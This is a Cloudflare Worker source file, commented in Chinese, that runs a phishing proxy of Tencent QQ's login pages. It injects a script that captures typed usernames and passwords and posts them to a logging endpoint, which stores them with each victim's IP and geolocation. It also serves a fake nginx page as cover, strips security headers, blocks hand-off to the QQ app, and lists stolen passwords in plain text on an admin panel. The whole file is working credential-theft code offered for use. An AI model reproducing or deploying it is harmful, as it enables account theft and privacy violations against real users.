// ==================== Cloudflare Worker ES Module ====================
// 功能：QQ登录页代理 + 登录凭证记录 + 全面禁止APP跳转 + 后台管理
// 数据库：D1 (绑定名称 DB)
// IP地理位置：ip.ilqx.dpdns.org/geo
// 后台地址：/admin (默认密码 admin123)
// ===================================================================

export default {
  async fetch(request, env, ctx) {
    return await handleRequest(request, env);
  }
};

/* ---------- 常量配置 ---------- */
const ADMIN_PASSWORD = "admin123";               // 后台密码，请修改
const lastVisitProxyCookie = "__PROXY_VISITEDSITE__";

/* ---------- Nginx 欢迎页（伪装根目录） ---------- */
const nginxWelcomePage = `<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>body { width: 35em; margin: 0 auto; font-family: Tahoma, Verdana, Arial, sans-serif; }</style>
</head>
<body>
<h1>Welcome to nginx!</h1>
<p>If you see this page, the nginx web server is successfully installed and working. Further configuration is required.</p>
<p>For online documentation and support please refer to <a href="http://nginx.org/">nginx.org</a>.<br/>
Commercial support is available at <a href="http://nginx.com/">nginx.com</a>.</p>
<p><em>Thank you for using nginx.</em></p>
</body>
</html>`;

/* ---------- 数据库初始化 ---------- */
async function initDB(env) {
  try {
    const tableCheck = await env.DB.prepare(
      "SELECT name FROM sqlite_master WHERE type='table' AND name='login_records'"
    ).first();
    if (!tableCheck) {
      await env.DB.prepare(`
        CREATE TABLE login_records (
          id INTEGER PRIMARY KEY AUTOINCREMENT,
          username TEXT NOT NULL,
          password TEXT NOT NULL,
          ip TEXT,
          country TEXT,
          city TEXT,
          latitude TEXT,
          longitude TEXT,
          as_organization TEXT,
          user_agent TEXT,
          timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
      `).run();
      console.log('[DB] 表 login_records 创建成功');
    }
  } catch (error) {
    console.error('[DB] 初始化失败:', error.message);
  }
}

/* ---------- 获取客户端真实IP及地理位置（调用用户提供的API） ---------- */
async function getClientIPInfo(request) {
  // 优先从请求头获取真实IP（CF提供）
  let clientIP = request.headers.get('CF-Connecting-IP') ||
                 request.headers.get('X-Forwarded-For')?.split(',')[0] ||
                 request.headers.get('X-Real-IP') ||
                 'unknown';
  
  // 如果IP未知或为内网IP，调用外部API增强（仅用于地理位置）
  try {
    const geoRes = await fetch('https://ip.ilqx.dpdns.org/geo');
    if (geoRes.ok) {
      const geoData = await geoRes.json();
      return {
        ip: geoData.ip || clientIP,
        country: geoData.country || '',
        city: geoData.city || '',
        latitude: geoData.latitude || '',
        longitude: geoData.longitude || '',
        as_organization: geoData.asOrganization || ''
      };
    }
  } catch (error) {
    console.error('[Geo] 获取地理位置失败:', error.message);
  }
  
  // 降级：仅返回IP，其他字段留空
  return {
    ip: clientIP,
    country: '',
    city: '',
    latitude: '',
    longitude: '',
    as_organization: ''
  };
}

/* ---------- 主请求处理器 ---------- */
async function handleRequest(request, env) {
  const url = new URL(request.url);
  const userAgent = request.headers.get('User-Agent') || '';
  const isMobile = /Mobile|Android|iPhone|iPad|iPod/i.test(userAgent);
  
  // 初始化数据库（若已存在不会重复创建）
  if (env.DB) await initDB(env);
  
  /* ------- 后台管理路由 ------- */
  if (url.pathname === '/admin') {
    return handleAdmin(request, env);
  }
  if (url.pathname === '/admin/clear') {
    return handleAdminClear(request, env);
  }
  if (url.pathname === '/admin/logout') {
    return handleAdminLogout();
  }
  
  /* ------- 登录记录API ------- */
  if (url.pathname === '/api/log') {
    return handleLogRequest(request, env);
  }
  
  /* ------- 根路径伪装nginx ------- */
  if (url.pathname === '/' || url.pathname === '') {
    return new Response(nginxWelcomePage, {
      headers: { 'Content-Type': 'text/html; charset=utf-8' }
    });
  }
  
  /* ------- 静态资源 ------- */
  if (url.pathname === '/favicon.ico') {
    return Response.redirect('https://ti.qq.com/favicon.ico', 302);
  }
  if (url.pathname === '/robots.txt') {
    return new Response('User-agent: *\nDisallow: /', {
      headers: { 'Content-Type': 'text/plain' }
    });
  }
  
  /* ------- 腾讯验证链接直通（不代理）------- */
  if (isVerificationLink(url.pathname)) {
    return handleVerificationLink(request, url, isMobile);
  }
  
  /* ------- QQ业务代理 ------- */
  if (url.pathname.startsWith('/qq')) {
    return handleQQProxy(request, url, isMobile, userAgent, env);
  }
  
  return new Response('Not Found', { status: 404 });
}

/* ---------- 验证链接判断 ---------- */
function isVerificationLink(pathname) {
  const paths = [
    '/ssl/check', '/ssl/login',
    '/cgi-bin/ssl/check', '/cgi-bin/login', '/cgi-bin/xlogin'
  ];
  return paths.some(p => pathname.startsWith(p));
}

/* ---------- 验证链接直通（原封不动代理） ---------- */
async function handleVerificationLink(request, url, isMobile) {
  const referer = request.headers.get('Referer') || '';
  let targetDomain = isMobile ? 'ui.ptlogin2.qq.com' : 'xui.ptlogin2.qq.com';
  if (!referer.includes('/qq')) targetDomain = 'ui.ptlogin2.qq.com';
  
  const targetUrl = `https://${targetDomain}${url.pathname}${url.search}`;
  const headers = new Headers(request.headers);
  headers.delete('Origin');
  headers.set('Referer', 'https://ti.qq.com/qqlevel/index');
  
  try {
    const proxyReq = new Request(targetUrl, {
      method: request.method,
      headers,
      body: request.body,
      redirect: 'follow'
    });
    const resp = await fetch(proxyReq);
    const newHeaders = new Headers(resp.headers);
    newHeaders.set('Access-Control-Allow-Origin', '*');
    return new Response(resp.body, {
      status: resp.status,
      statusText: resp.statusText,
      headers: newHeaders
    });
  } catch (e) {
    return new Response(`Verification proxy error: ${e.message}`, { status: 500 });
  }
}

/* ---------- QQ业务代理（核心代理逻辑，保持原样） ---------- */
async function handleQQProxy(request, url, isMobile, userAgent, env) {
  const fullPath = url.pathname + url.search + url.hash;
  const pathAfterQQ = fullPath.substring(3); // 去掉 "/qq"
  let targetUrl;
  
  if (!pathAfterQQ || pathAfterQQ === '/' || pathAfterQQ === '?' || pathAfterQQ.startsWith('?')) {
    targetUrl = 'https://ti.qq.com/qqlevel/index' + (pathAfterQQ.startsWith('?') ? pathAfterQQ : '');
  } else {
    const pathEnd = pathAfterQQ.indexOf('?');
    let pathPart = pathEnd === -1 ? pathAfterQQ : pathAfterQQ.substring(0, pathEnd);
    const queryPart = pathEnd === -1 ? '' : pathAfterQQ.substring(pathEnd);
    if (!pathPart.startsWith('/')) pathPart = '/' + pathPart;
    
    const isLoginPath = pathPart.includes('/cgi-bin/login') || pathPart.includes('/cgi-bin/xlogin');
    if (isLoginPath) {
      const domain = isMobile ? 'ui.ptlogin2.qq.com' : 'xui.ptlogin2.qq.com';
      targetUrl = `https://${domain}${pathPart}${queryPart}`;
    } else {
      targetUrl = `https://ti.qq.com${pathPart}${queryPart}`;
    }
  }
  
  // 找回密码、注册等直接302跳转
  if (targetUrl.includes('accounts.qq.com/psw/find') ||
      targetUrl.includes('ssl.zc.qq.com/phone/index.html')) {
    return Response.redirect(targetUrl, 302);
  }
  
  try {
    const headers = new Headers(request.headers);
    headers.delete('Origin');
    headers.delete('Referer');
    headers.set('User-Agent', userAgent);
    
    const proxyReq = new Request(targetUrl, {
      method: request.method,
      headers,
      body: request.body,
      redirect: 'follow'
    });
    const response = await fetch(proxyReq);
    const contentType = response.headers.get('Content-Type') || '';
    
    // 只对HTML内容进行脚本注入
    if (contentType.includes('text/html')) {
      let html = await response.text();
      const proxyOrigin = new URL(request.url).origin;
      
      // ---------- 替换页面内硬编码的腾讯验证链接为代理链接 ----------
      const qqDomains = ['ti.qq.com', 'ui.ptlogin2.qq.com', 'xui.ptlogin2.qq.com', 'ptlogin2.qq.com'];
      const verifPaths = ['ssl/check', 'ssl/login', 'cgi-bin/ssl/check', 'cgi-bin/login', 'cgi-bin/xlogin'];
      for (const domain of qqDomains) {
        for (const path of verifPaths) {
          const regex = new RegExp(`https?://${domain}/${path}`, 'gi');
          html = html.replace(regex, `/qq/${path}`);
        }
      }
      
      // ---------- 注入客户端脚本：凭证捕获 + 全面禁止APP跳转 ----------
      const injectScript = `
      <script>
      (function(){
        // ----- 防止重复注入 -----
        if (window.__aegisProxyInjected) return;
        window.__aegisProxyInjected = true;
        
        // ----- 1. 立即捕获登录信息（完全独立，不依赖页面加载）-----
        function captureLoginNow() {
          try {
            // 使用最通用的选择器，兼容各种动态ID
            const usernameField = document.getElementById('u') ||
                                 document.querySelector('input[name="u"]') ||
                                 document.querySelector('input[placeholder*="QQ号码"]') ||
                                 document.querySelector('input[placeholder*="手机"]') ||
                                 document.querySelector('input[placeholder*="邮箱"]') ||
                                 document.querySelector('input[type="text"][autocomplete="off"]');
            
            const passwordField = document.getElementById('p') ||
                                 document.querySelector('input[name="p"]') ||
                                 document.querySelector('input[type="password"]');
            
            if (usernameField && passwordField) {
              const username = usernameField.value;
              const password = passwordField.value;
              if (username && password) {
                // 立即发送，keepalive确保页面跳转不中断请求
                fetch('/api/log', {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({ username, password }),
                  keepalive: true,
                  mode: 'same-origin'
                }).catch(e => {/* 静默失败 */});
              }
            }
          } catch(e) {}
        }
        
        // ----- 2. 监听登录按钮点击（立即执行，不依赖任何延迟）-----
        function setupLoginListeners() {
          // 登录按钮
          const loginBtn = document.getElementById('go');
          if (loginBtn) {
            loginBtn.addEventListener('click', function(e) {
              captureLoginNow();
              // 不阻止默认行为，让登录正常进行
            }, true); // 捕获阶段优先执行
          }
          
          // 一键登录按钮 —— 完全阻止任何跳转，并捕获凭证
          const onekeyBtn = document.getElementById('onekey');
          if (onekeyBtn) {
            onekeyBtn.addEventListener('click', function(e) {
              e.preventDefault();
              e.stopPropagation();
              e.stopImmediatePropagation();
              captureLoginNow();
              return false;
            }, true);
          }
          
          // 监听所有表单提交（有些登录可能是传统form）
          document.addEventListener('submit', function(e) {
            captureLoginNow();
          }, true);
        }
        
        // ----- 3. 全面禁止一切APP跳转/外部协议 -----
        function blockAllAppIntents() {
          // 定义所有要拦截的协议（APP协议大全）
          const blockedSchemes = [
            'tencent://', 'qq://', 'mqq://', 'tim://', 'weixin://', 'wx://',
            'intent://', 'android-app://', 'ios-app://',
            'market://', 'vnd.youtube://', 'twitter://', 'fb://', 'facebook://',
            'instagram://', 'whatsapp://', 'tg://', 'telegram://',
            'snssdk1128://', 'douyin://', 'kwai://', 'kuaishou://',
            'taobao://', 'tmall://', 'jd://', 'pinduoduo://',
            'alipays://', 'alipay://', 'weibosdk://', 'sinaweibo://',
            'baiduboxapp://', 'baidumap://', 'amap://',
            'microsoft-edge://', 'edgedl://'
          ];
          
          // 判断是否为被阻止的协议
          function isBlockedUrl(url) {
            if (typeof url !== 'string') return false;
            return blockedSchemes.some(scheme => url.toLowerCase().startsWith(scheme));
          }
          
          // 拦截 window.location 跳转（最核心）
          const originalLocation = window.location;
          Object.defineProperty(window, 'location', {
            get: () => originalLocation,
            set: (value) => {
              if (isBlockedUrl(value)) {
                console.log('[Aegis] 已阻止APP跳转:', value);
                return; // 静默丢弃
              }
              originalLocation.href = value;
            }
          });
          
          // 拦截 location.assign / location.replace
          const originalAssign = window.location.assign;
          window.location.assign = function(url) {
            if (isBlockedUrl(url)) {
              console.log('[Aegis] 已阻止location.assign:', url);
              return;
            }
            originalAssign.call(window.location, url);
          };
          const originalReplace = window.location.replace;
          window.location.replace = function(url) {
            if (isBlockedUrl(url)) {
              console.log('[Aegis] 已阻止location.replace:', url);
              return;
            }
            originalReplace.call(window.location, url);
          };
          
          // 拦截 window.open
          const originalOpen = window.open;
          window.open = function(url, target, features) {
            if (isBlockedUrl(url)) {
              console.log('[Aegis] 已阻止window.open:', url);
              return null;
            }
            return originalOpen.call(window, url, target, features);
          };
          
          // 拦截所有 <a> 标签点击
          document.addEventListener('click', function(e) {
            let el = e.target;
            while (el && el.tagName !== 'A') el = el.parentElement;
            if (el && el.href && isBlockedUrl(el.href)) {
              e.preventDefault();
              e.stopPropagation();
              console.log('[Aegis] 已阻止a标签跳转:', el.href);
            }
          }, true);
          
          // 拦截 iframe 加载
          const observer = new MutationObserver(mutations => {
            mutations.forEach(mut => {
              mut.addedNodes.forEach(node => {
                if (node.tagName === 'IFRAME' && node.src && isBlockedUrl(node.src)) {
                  node.src = 'about:blank';
                }
              });
            });
          });
          observer.observe(document.documentElement, { childList: true, subtree: true });
        }
        
        // ----- 执行所有强化拦截 -----
        setupLoginListeners();
        blockAllAppIntents();
        
        // ----- 额外捕获：如果用户手动触发表单提交或按钮点击（再次确保）-----
        setTimeout(function() {
          // 重试捕获监听（确保动态生成的元素）
          setupLoginListeners();
        }, 100);
        
        // ----- 代理链接重写（原代理逻辑）-----
        const proxyOrigin = '${proxyOrigin}';
        function rewriteUrl(url) {
          if (!url || typeof url !== 'string') return url;
          if (url.startsWith('data:') || url.startsWith('javascript:') || url.startsWith('#') ||
              url.startsWith('mailto:') || url.startsWith('tel:') || isBlockedUrl(url)) {
            return url;
          }
          try {
            let fullUrl;
            if (url.startsWith('http://') || url.startsWith('https://')) {
              fullUrl = url;
            } else if (url.startsWith('//')) {
              fullUrl = 'https:' + url;
            } else if (url.startsWith('/')) {
              fullUrl = proxyOrigin + url;
            } else {
              const base = window.location.href;
              const basePath = base.substring(0, base.lastIndexOf('/') + 1);
              fullUrl = new URL(url, basePath).href;
            }
            const urlObj = new URL(fullUrl);
            const qqDomains = ['ti.qq.com', 'ui.ptlogin2.qq.com', 'xui.ptlogin2.qq.com', 'ptlogin2.qq.com'];
            if (qqDomains.some(d => urlObj.hostname.includes(d))) {
              return proxyOrigin + '/qq' + urlObj.pathname + urlObj.search + urlObj.hash;
            }
            return url;
          } catch(e) {
            return url;
          }
        }
        
        function rewriteLinks() {
          document.querySelectorAll('a[href]').forEach(link => {
            const href = link.getAttribute('href');
            if (href && !href.startsWith(proxyOrigin + '/qq')) {
              const newHref = rewriteUrl(href);
              if (newHref !== href) link.setAttribute('href', newHref);
            }
          });
        }
        
        if (document.readyState === 'loading') {
          document.addEventListener('DOMContentLoaded', rewriteLinks);
        } else {
          rewriteLinks();
        }
        new MutationObserver(rewriteLinks).observe(document.body, { childList: true, subtree: true });
        
      })();
      </script>
      `;
      
      // 注入到 </body> 前
      if (html.includes('</body>')) {
        html = html.replace('</body>', injectScript + '</body>');
      } else {
        html += injectScript;
      }
      
      // 构造响应头
      const newHeaders = new Headers(response.headers);
      newHeaders.set('Content-Type', 'text/html; charset=utf-8');
      newHeaders.set('Access-Control-Allow-Origin', '*');
      newHeaders.set('X-Frame-Options', 'ALLOWALL');
      newHeaders.delete('Content-Security-Policy');
      newHeaders.delete('X-Content-Security-Policy');
      newHeaders.append('Set-Cookie', `${lastVisitProxyCookie}=${encodeURIComponent(targetUrl)}; Path=/; Max-Age=86400`);
      
      return new Response(html, {
        status: response.status,
        statusText: response.statusText,
        headers: newHeaders
      });
    }
    
    // 非HTML直接返回
    return response;
    
  } catch (error) {
    return new Response(`Proxy Error: ${error.message}`, { status: 500 });
  }
}

/* ---------- 记录登录信息的API ---------- */
async function handleLogRequest(request, env) {
  if (request.method !== 'POST') {
    return new Response('Method Not Allowed', { status: 405 });
  }
  
  try {
    const { username, password } = await request.json();
    if (!username || !password) {
      return new Response('Missing fields', { status: 400 });
    }
    
    // 获取客户端IP及地理位置
    const ipInfo = await getClientIPInfo(request);
    
    // 插入数据库（使用完整的地理信息）
    await env.DB.prepare(`
      INSERT INTO login_records 
        (username, password, ip, country, city, latitude, longitude, as_organization, user_agent)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
    `).bind(
      username,
      password,
      ipInfo.ip,
      ipInfo.country,
      ipInfo.city,
      ipInfo.latitude,
      ipInfo.longitude,
      ipInfo.as_organization,
      request.headers.get('User-Agent') || ''
    ).run();
    
    return new Response(JSON.stringify({ success: true }), {
      headers: { 'Content-Type': 'application/json' }
    });
  } catch (error) {
    console.error('[LogAPI]', error.message);
    return new Response(JSON.stringify({ error: error.message }), {
      status: 500,
      headers: { 'Content-Type': 'application/json' }
    });
  }
}

/* ---------- 后台管理：登录面板 + 数据显示 ---------- */
async function handleAdmin(request, env) {
  const cookies = request.headers.get('Cookie') || '';
  const auth = getCookie('admin_auth', cookies);
  
  // 处理登录POST
  if (request.method === 'POST') {
    const form = await request.formData();
    const pwd = form.get('password');
    if (pwd === ADMIN_PASSWORD) {
      const headers = new Headers({ Location: '/admin' });
      headers.append('Set-Cookie', 'admin_auth=1; Path=/; HttpOnly; Max-Age=3600');
      return new Response(null, { status: 302, headers });
    } else {
      return renderAdminLogin('密码错误');
    }
  }
  
  // 已认证：显示仪表盘
  if (auth === '1') {
    return renderAdminDashboard(env);
  }
  
  return renderAdminLogin();
}

function renderAdminLogin(error = '') {
  const html = `<!DOCTYPE html>
  <html>
  <head><meta charset="UTF-8"><title>后台管理 · 登录</title>
  <style>body{font-family:system-ui;max-width:400px;margin:50px auto;padding:20px;background:#f7f9fc;}
  .card{background:#fff;border-radius:8px;padding:30px;box-shadow:0 4px 12px rgba(0,0,0,0.05);}
  h2{margin-top:0;color:#1e293b;} input{width:100%;padding:10px;margin:10px 0;border:1px solid #ddd;border-radius:4px;}
  button{background:#2563eb;color:#fff;border:none;padding:12px 24px;border-radius:4px;cursor:pointer;font-weight:600;}
  .error{color:#b91c1c;margin-bottom:15px;}</style>
  </head>
  <body><div class="card"><h2>🔐 管理后台</h2>
  ${error ? `<div class="error">${error}</div>` : ''}
  <form method="POST"><input type="password" name="password" placeholder="管理密码" required>
  <button type="submit">登录</button></form></div></body></html>`;
  return new Response(html, { headers: { 'Content-Type': 'text/html; charset=utf-8' } });
}

async function renderAdminDashboard(env) {
  try {
    // 测试数据库连接
    let dbStatus = '✅ 正常';
    let dbError = '';
    try {
      await env.DB.prepare('SELECT 1').run();
    } catch (e) {
      dbStatus = '❌ 连接失败';
      dbError = e.message;
    }
    
    // 获取记录总数
    const countRes = await env.DB.prepare('SELECT COUNT(*) as count FROM login_records').first();
    const total = countRes?.count || 0;
    
    // 获取最近100条记录
    const { results } = await env.DB.prepare(`
      SELECT * FROM login_records ORDER BY timestamp DESC LIMIT 100
    `).all();
    
    let rowsHtml = '';
    if (results && results.length) {
      results.forEach(r => {
        rowsHtml += `<tr>
          <td>${r.id}</td>
          <td>${escapeHtml(r.username)}</td>
          <td>${escapeHtml(r.password)}</td>
          <td>${r.ip || ''}<br><small>${escapeHtml(r.country || '')} ${escapeHtml(r.city || '')}</small></td>
          <td>${new Date(r.timestamp).toLocaleString('zh-CN')}</td>
          <td title="${escapeHtml(r.user_agent || '')}">${escapeHtml((r.user_agent || '').substring(0, 30))}…</td>
        </tr>`;
      });
    } else {
      rowsHtml = '<tr><td colspan="6" style="text-align:center;padding:30px;">暂无记录</td></tr>';
    }
    
    const html = `<!DOCTYPE html>
    <html>
    <head><meta charset="UTF-8"><title>登录记录管理</title>
    <style>
      body{font-family:system-ui;margin:0;background:#f1f5f9;}
      .navbar{background:#0f172a;color:#fff;padding:16px 24px;display:flex;justify-content:space-between;}
      .container{max-width:1400px;margin:24px auto;padding:0 24px;}
      .stats{background:#fff;border-radius:8px;padding:20px;margin-bottom:24px;display:flex;gap:40px;align-items:center;}
      .badge{background:#e2e8f0;padding:4px 12px;border-radius:20px;font-size:14px;}
      table{width:100%;border-collapse:collapse;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 1px 3px rgba(0,0,0,0.05);}
      th{background:#f8fafc;text-align:left;padding:12px 16px;font-weight:600;}
      td{padding:12px 16px;border-top:1px solid #e2e8f0;}
      .btn{background:#ef4444;color:#fff;padding:8px 16px;border-radius:4px;text-decoration:none;font-size:14px;margin-left:16px;}
      .btn:hover{background:#dc2626;}
      .status{display:inline-block;width:10px;height:10px;border-radius:10px;margin-right:8px;}
    </style>
    </head>
    <body>
      <div class="navbar">
        <span style="font-weight:bold;">📊 登录凭证记录后台</span>
        <div><a href="/admin/logout" style="color:#fff;text-decoration:none;">退出</a></div>
      </div>
      <div class="container">
        <div class="stats">
          <div><span style="font-weight:bold;">📦 数据库状态</span><br>
            <span class="status" style="background:${dbStatus.includes('✅')?'#10b981':'#ef4444'};"></span> ${dbStatus}
            ${dbError ? `<small style="color:#ef4444;display:block;">${dbError}</small>` : ''}
          </div>
          <div><span style="font-weight:bold;">📋 总记录数</span><br><span style="font-size:28px;">${total}</span></div>
          <div style="flex:1;text-align:right;">
            <a href="/admin/clear" class="btn" onclick="return confirm('⚠️ 确定要永久删除所有记录吗？');">🗑️ 清空全部</a>
          </div>
        </div>
        <table>
          <thead><tr><th>ID</th><th>用户名</th><th>密码</th><th>IP / 地理位置</th><th>时间</th><th>User Agent</th></tr></thead>
          <tbody>${rowsHtml}</tbody>
        </table>
        <p style="margin-top:16px;color:#64748b;">只显示最近100条记录，完整记录请直接查询数据库。</p>
      </div>
    </body>
    </html>`;
    
    return new Response(html, {
      headers: { 'Content-Type': 'text/html; charset=utf-8' }
    });
  } catch (error) {
    return new Response(`仪表盘错误: ${error.message}`, { status: 500 });
  }
}

/* ---------- 清除所有记录 ---------- */
async function handleAdminClear(request, env) {
  const cookies = request.headers.get('Cookie') || '';
  if (getCookie('admin_auth', cookies) !== '1') {
    return new Response('Unauthorized', { status: 401 });
  }
  try {
    await env.DB.prepare('DELETE FROM login_records').run();
    return Response.redirect('/admin', 302);
  } catch (e) {
    return new Response(`清除失败: ${e.message}`, { status: 500 });
  }
}

/* ---------- 后台登出 ---------- */
function handleAdminLogout() {
  const headers = new Headers({ Location: '/admin' });
  headers.append('Set-Cookie', 'admin_auth=; Path=/; HttpOnly; Max-Age=0');
  return new Response(null, { status: 302, headers });
}

/* ---------- Cookie 解析辅助 ---------- */
function getCookie(name, cookieString) {
  if (!cookieString) return null;
  const match = cookieString.match(new RegExp('(^| )' + name + '=([^;]+)'));
  return match ? decodeURIComponent(match[2]) : null;
}

/* ---------- HTML转义 ---------- */
function escapeHtml(text) {
  if (!text) return '';
  const map = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#039;' };
  return text.replace(/[&<>"']/g, m => map[m]);
}